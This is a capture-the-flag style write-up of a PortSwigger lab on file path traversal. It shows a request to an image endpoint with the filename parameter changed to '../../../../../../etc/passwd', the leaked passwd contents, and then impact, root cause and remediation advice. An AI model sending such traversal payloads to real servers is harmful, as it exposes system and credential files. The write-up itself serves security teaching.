<div align="center">

# File Path Traversal  
### Arbitrary File Read Vulnerability

[![Vulnerability](https://img.shields.io/badge/Vulnerability-Path%20Traversal-red)](https://owasp.org/www-community/attacks/Path_Traversal)
[![CWE](https://img.shields.io/badge/CWE-22-blue)](https://cwe.mitre.org/data/definitions/22.html)
[![Source](https://img.shields.io/badge/Source-PortSwigger-lightgrey)](https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/lab-simple#)



</div>

---

## Overview

This lab demonstrates a  [File Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) vulnerability that allows an attacker to read arbitrary files from the server’s underlying operating system.  
The issue arises due to improper handling of user-supplied input that is used to access files on the server.

---

## Application Behavior

The application is an online storefront that displays a list of products on the home page.  
Each product has an associated product page that includes an image.

When a product page is loaded, the browser makes a request to retrieve the product image from the server using the following endpoint:

```http
GET /image?filename=53.jpg
```

This confirms that the application is vulnerable to **arbitrary file read**, as it successfully discloses a sensitive system file that should never be accessible to users.

---

### Proof of Concept (PoC)
----------------------

The image loading functionality can be abused to read sensitive system files.

## Original Request

A legitimate request for a product image:

`GET /image?filename=53.jpg HTTP/2
Host: <lab-id>.web-security-academy.net `

This request returns the intended image file.

---

## Malicious Request

The `filename` parameter was modified to include\
[directory traversal sequences](https://owasp.org/www-community/attacks/Path_Traversal)\
in order to access a sensitive\
[system file](https://en.wikipedia.org/wiki/Unix_filesystem):

`GET /image?filename=../../../../../../etc/passwd HTTP/2
Host: <lab-id>.web-security-academy.net `

---

## Result

The server responds with\
HTTP 200 OK\
and returns the contents of\
[`/etc/passwd`](https://en.wikipedia.org/wiki/Passwd):

`root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
carlos:x:12002:12002::/home/carlos:/bin/bash `

This confirms that the application is vulnerable to\
[arbitrary file read](https://portswigger.net/web-security/file-path-traversal),\
as it discloses a sensitive system file that should never be accessible to users.

---

## Impact

Successful exploitation allows an attacker to:

- Read sensitive  [system files](https://en.wikipedia.org/wiki/Unix_filesystem)
- Enumerate valid system users
- Access application configuration files that may contain credentials
- Collect information useful for further attacks such as privilege escalation or lateral movement

This vulnerability results in serious  [information disclosure](https://owasp.org/www-community/vulnerabilities/Information_exposure)  and significantly weakens the security posture of the application.

---

## Root Cause

The vulnerability exists because the application:

- Directly trusts user input for file system access
- Performs no path normalization or validation
- Does not restrict file access to a fixed base directory
- Lacks an allowlist of permitted files

This violates secure file handling practices recommended by  [OWASP](https://owasp.org/www-project-top-ten/).

---

## Recommended Remediation

To mitigate this vulnerability, the application should:

- Sanitize and validate all file path input
- Explicitly block traversal sequences such as `../` and `..\\`
- Resolve file paths and verify they remain within a fixed base directory
- Use an allowlist of permitted filenames instead of accepting arbitrary input

### Additional Guidance

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

---

## Conclusion

The application is vulnerable to  [**File Path Traversal**](https://owasp.org/www-community/attacks/Path_Traversal),  
allowing attackers to read arbitrary files from the underlying operating system by abusing the image loading functionality. By manipulating the `filename` parameter, sensitive system files such as  [`/etc/passwd`](https://en.wikipedia.org/wiki/Passwd)  
can be disclosed, leading to critical information exposure. This issue must be remediated to prevent further exploitation.

---

<div align="center">

**Lab solved — vulnerability confirmed**

</div>
